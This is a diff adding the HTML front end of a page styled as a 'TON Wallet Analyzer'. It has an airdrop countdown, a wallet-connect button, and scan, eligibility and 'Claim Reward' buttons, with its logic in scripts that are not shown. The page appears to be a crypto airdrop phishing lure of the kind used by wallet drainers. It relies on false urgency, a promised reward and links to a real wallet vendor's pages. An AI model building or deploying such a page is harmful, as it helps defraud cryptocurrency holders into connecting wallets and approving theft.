@@ -1,0 +1,90 @@
+<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<title>TON Wallet Analyzer</title>
+
+<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+<script src="https://unpkg.com/tonweb@2.0.0-beta.0/dist/index.min.js"></script>
+<link rel="stylesheet" href="connect.css" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+<link
+
+  href="https://fonts.googleapis.com/css2?family=Italianno&family=Montserrat:ital,wght@0,100..900;1,100..900&family=Winky+Rough:ital,wght@0,300..900;1,300..900&display=swap"
+
+  rel="stylesheet"
+
+/>
+
+  <link rel="stylesheet" type="text/css" href="navbar.css">
+
+  <title>connect</title></head><body>
+    <h1 style= "color: #040724c0; text-shadow: 0 0 10px rgba(0, 68, 255, 0.7); font-family: Arial, sans-serif; margin-bottom: 0; text-align: center;">Airdrop Ends In:</h1>
+  <div id="timer" style= "color: #040724c0; text-shadow: 0 0 10px rgba(0, 68, 255, 0.7); font-weight: bold; font-size: 1.3em; text-align: center;">Loading...</div>
+    
+  </div>  <!-- CONNECT PAGE -->  <div id="connectPage">
+
+  <img src="logo_full.svg" alt="Logo" class="top-right-logo" />
+
+<header>
+
+  
+
+  <h2 style="color: #040724c0; text-shadow: 0 0 10px rgba(0, 68, 255, 0.7); text-align: center; margin-left: 15px;">
+
+    Discover Your TON Potential
+
+  </h2>
+
+
+
+  <div id="ton-connect" class="connectbtn"></div>
+
+</header>
+
+  <button class="open-btn" onclick="toggleSidebar()">☰</button>
+
+  <div id="mySidebar" class="sidebar"><a href="#">Airdrop</a>
+
+<a href="">Contact</a>
+
+<a href="https://tonhub.com/getApp">Download</a>
+
+<a href="https://tonhub.com/legal/privacy">Privacy Policy</a>
+
+  </div><div class="app-container">
+
+  <p id="wallet-address" style="color: #040724c0; text-shadow: 0 0 10px rgba(0, 68, 255, 0.7)">Wallet: Not connected
+
+  </p><button class="btn" onclick="scanWallet()">🔍 Scan Wallet</button>
+
+  <div id="result" class="ranks"></div><button class="btn" onclick="showEligibility()" style="display: none"> 📜 Check Eligibility</button>
+
+  <div id="checks" class="montserrat-text" style="display: none"></div>  <div id="balanceResult" style="font-size: 1.1em;"></div><button class="btn" id="claimBtn" onclick="claimTon()" style="display: none" disabled>💸 Claim Reward</button>
+
+  <span><a id="toggleTransactions" onclick="toggleTransactions()" style="display: none" class="trxlist">
+
+  ⏩ Show Transactions
+
+</a>
+
+  </span></div><script>
+  
+      function toggleSidebar() {
+  
+        const sidebar = document.getElementById("mySidebar");
+  
+        sidebar.classList.toggle("open");
+  
+      }
+  
+    </script><div id="transactionContainer" class="transaction-list" style="display: none;"></div> <script src="connect.js"></script>
+    <script src="timer.js"></script>
+    
+    </body></html> 
